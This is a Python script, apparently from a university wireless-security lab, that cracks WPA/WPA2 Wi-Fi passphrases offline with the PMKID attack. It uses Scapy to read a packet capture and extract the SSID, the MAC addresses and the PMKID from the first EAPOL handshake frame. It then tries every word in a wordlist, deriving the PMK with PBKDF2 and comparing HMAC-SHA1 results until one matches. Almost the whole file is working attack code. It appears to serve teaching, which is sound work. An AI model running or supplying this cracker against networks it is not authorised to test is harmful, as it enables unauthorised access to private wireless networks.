#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Compute PMKID from Passphrase and 4-way handshake info

Calcul des PMKID d'une liste de mots pour les comparer à celui trouvé 
dans le handshake 1
"""

__author__      = "Abraham Rubinstein et Yann Lederrey | modified By Schranz Guillaume et Lièvre Loïc"
__copyright__   = "Copyright 2021, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def getBeacon(packets):
    """
    Trouve le 1er beacon qui contient un SSID d'une liste de paquet
    """
    for packet in packets:
        #retourne le premier beacon trouvé
        if packet.type == 0 and packet.subtype == 8:
                return packet

def getFirstHandshake(packets, APmac):
    """
    Trouve le 1er Handshake d'une liste de paquets
    à l'aide de la mac de l'AP et du client
    """
    for packet in packets:
        #va chercher un paquet de handshake
        if packet.haslayer(EAPOL) and packet.type == 2 and packet.subtype == 8:
            packetSrc = a2b_hex(packet.addr2.replace(":", "")) #nettoie l'adresse avant d ela comparer
            #retourne le premier handshake de l'AP trouvé
            if packet.FCfield == "from-DS" and packetSrc == APmac:
                return packet

def printStatus(passPhrase, ssid, APmac, Clientmac, pmkid):
    print ("=============================")
    #n'affiche une passphrase que si la variable est renseignée
    if passPhrase != "":
        print ("Passphrase: ",passPhrase,"\n")
    print ("SSID: ",ssid,"\n")
    print ("AP Mac: ",b2a_hex(APmac),"\n")
    print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
    print ("PMKID: ", b2a_hex(pmkid),"\n")

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

#trouve le beacon avec le SSID
packetBroadcast = getBeacon(wpa)

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid        = packetBroadcast.info #on recupere le ssid dans le beacon
APmac       = a2b_hex(packetBroadcast.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
packetHS1   = getFirstHandshake(wpa, APmac) #on va chercher le handshake 1
Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1
pmkid = raw(packetHS1)[-20:-4] #on recupere le pmkid du handshake 1

#montre les parametres avant les calculs
print ("\n\nValues used to construct PMKID")
printStatus("", ssid, APmac, Clientmac, pmkid)

#on ouvre le fichier de mots
fileWords = open("wordslist.txt", "r")


print("Computing...")
print ("=============================")

#on teste chaque mot du fichier
for word in fileWords.readlines():
    #on nettoie le mot sinon \n fais encore partie du mot
    cleanWord = word.strip()
    passPhrase = str.encode(cleanWord) #on encode la passphrase

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

    #compute a pmkid
    wordPMKID = hmac.new(pmk, b"PMK Name" + APmac + Clientmac,hashlib.sha1)

    #on vérifie si les deux pmkid sont égaux
    if wordPMKID.digest()[:16] == pmkid:
        #affiche les résultats
        print ("Correct passphrase : " + cleanWord)
        printStatus(cleanWord, ssid, APmac, Clientmac, pmkid)
        exit() #fin du programme si on a trouvé la passphrase
    else:
        print("Wrong passphrase : " + cleanWord)

#si on arrive ici c'est qu'aucune passphrase n'est correcte
print("No correct passphrases found")